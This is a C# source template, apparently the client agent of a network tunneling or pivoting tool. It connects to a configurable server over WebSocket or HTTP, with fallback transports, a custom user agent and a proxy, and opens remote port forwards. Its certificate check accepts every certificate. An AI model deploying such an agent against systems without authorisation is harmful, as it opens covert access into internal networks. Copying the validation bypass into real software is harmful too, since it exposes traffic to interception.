using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;

namespace MessengerClient
{
    public class Program
    {
        private const string SERVER_URL = "{{ server_url }}";
        private const string ENCRYPTION_KEY = "{{ encryption_key }}";
        private const string USER_AGENT = "{{ user_agent }}";
        private const string PROXY = "{{ proxy }}";
        private const double RETRY_DURATION = {{ retry_duration }};
        private const int RETRY_ATTEMPTS = {{ retry_attempts }};
        private static readonly string[] REMOTE_PORT_FORWARDS = new string[]
        {
            {% for rpf in remote_port_forwards %}
            "{{ rpf }}",
            {% endfor %}
        };

        private const string HTTP_ROUTE = "?EIO=4&transport=polling";
        private const string WS_ROUTE = "?EIO=4&transport=websocket";

        public static async Task Main(string[] args)
        {
            ServicePointManager.ServerCertificateValidationCallback =
                new RemoteCertificateValidationCallback(ValidateServerCertificate);

            byte[] encryptionKey = Crypto.Hash(ENCRYPTION_KEY);

            IWebProxy proxy = null;
            if (!string.IsNullOrEmpty(PROXY))
            {
                proxy = CreateWebProxy(PROXY);
                Console.WriteLine($"Using proxy: {PROXY}");
            }

            string uri = SERVER_URL.Trim('/');
            string[] schemes;

            if (uri.Contains("://"))
            {
                string[] urlParts = uri.Split(new[] { "://" }, 2, StringSplitOptions.None);
                schemes = urlParts[0].Split('+');
                uri = urlParts[1];
            }
            else
            {
                schemes = new[] { "ws", "http", "wss", "https" };
            }

            foreach (string scheme in schemes)
            {
                bool success = false;
                if (scheme.Contains("http"))
                    success = await TryHttp($"{scheme}://{uri}/{HTTP_ROUTE}", encryptionKey, proxy);
                else if (scheme.Contains("ws"))
                    success = await TryWs($"{scheme}://{uri}/{WS_ROUTE}", encryptionKey, proxy);

                if (success)
                    return;
            }

            Console.WriteLine("All connection attempts failed.");
        }

        private static async Task<bool> TryHttp(string url, byte[] encryptionKey, IWebProxy proxy)
        {
            try
            {
                Console.WriteLine($"[HTTP] Trying {url}");
                var client = new HTTPMessengerClient(url, encryptionKey, USER_AGENT, RETRY_DURATION, RETRY_ATTEMPTS, proxy);
                StartRemotePortForwards(client);
                await client.ConnectAsync();
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[HTTP] Failed: {ex.Message}");
                return false;
            }
        }

        private static async Task<bool> TryWs(string url, byte[] encryptionKey, IWebProxy proxy)
        {
            try
            {
                Console.WriteLine($"[WebSocket] Trying {url}");
                var client = new WebSocketMessengerClient(url, encryptionKey, USER_AGENT, RETRY_DURATION, RETRY_ATTEMPTS, proxy);
                StartRemotePortForwards(client);
                await client.ConnectAsync();
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[WebSocket] Failed: {ex.Message}");
                return false;
            }
        }

        private static void StartRemotePortForwards(MessengerClient client)
        {
            foreach (var config in REMOTE_PORT_FORWARDS)
            {
                try
                {
                    var forwarder = new RemotePortForwarder(client, config);
                    _ = forwarder.StartAsync();
                    Console.WriteLine($"Started RemotePortForwarder: {config}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed RemotePortForwarder {config}: {ex.Message}");
                }
            }
        }

        private static IWebProxy CreateWebProxy(string proxyConfig)
        {
            var proxyUri = new Uri(proxyConfig);
            var webProxy = new WebProxy(proxyUri);

            if (!string.IsNullOrEmpty(proxyUri.UserInfo))
            {
                string[] userInfo = proxyUri.UserInfo.Split(':');
                if (userInfo.Length == 2)
                    webProxy.Credentials = new NetworkCredential(userInfo[0], userInfo[1]);
            }

            return webProxy;
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
    }
}
